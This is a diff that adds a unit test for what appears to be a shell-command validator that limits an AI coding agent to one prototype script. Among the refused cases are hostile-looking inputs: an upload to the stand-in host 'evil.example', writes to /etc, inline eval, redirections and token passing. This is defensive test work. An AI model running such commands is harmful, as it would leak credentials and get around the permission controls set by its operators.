@@ -152,3 +152,22 @@ done`);
   refused('while true; do uuidgen; done');
   refused('for i in a; echo $i; done', /needs "do"/);
 });
+
+test('allows node for the kit\'s prototype script only', () => {
+  const script = '/work/project/.claude/skills/prototype/assets/prototype.mjs';
+  ok(`node ${script} status --base "$BASE_URL" --org "$ORG_ID" --board "$BOARD_ID" --context Registration --out /work/project/prototypes/registration`);
+  ok(`node .claude/skills/prototype/assets/prototype.mjs assemble --out prototypes/registration`);
+  ok(`EM_TOKEN="$TOKEN" node ${script} upload --base "$BASE_URL" --org "$ORG_ID" --board "$BOARD_ID" --out /tmp/p`);
+  ok(`EM_TOKEN=$EVENTMODELERS_TOKEN node ${script} upload --base https://api.eventmodelers.ai --org o --board b --out /tmp/p`);
+  refused('node -e "1"');
+  refused('node /tmp/prototype.mjs status --out /tmp/p', /prototype\.mjs/);
+  refused(`node ${script.replace('/work/project', '/tmp')} status --out /tmp/p`, /prototype\.mjs/);
+  refused(`node ${script} serve --out /tmp/p`, /status, assemble or upload/);
+  refused(`node ${script} upload --base https://evil.example --out /tmp/p`, /may only call/);
+  refused(`node ${script} upload --out /etc/x`, /outside/);
+  refused(`node ${script} upload --out /tmp/p --eval 1`, /not allowed/);
+  refused(`node ${script} upload --out /tmp/p > /tmp/x`, /redirections/);
+  refused('EM_TOKEN="$TOKEN" echo hi', /EM_TOKEN/);
+  refused(`EM_TOKEN=abc node ${script} status --out /tmp/p`, /EM_TOKEN/);
+  refused(`X="$TOKEN" node ${script} status --out /tmp/p`);
+});
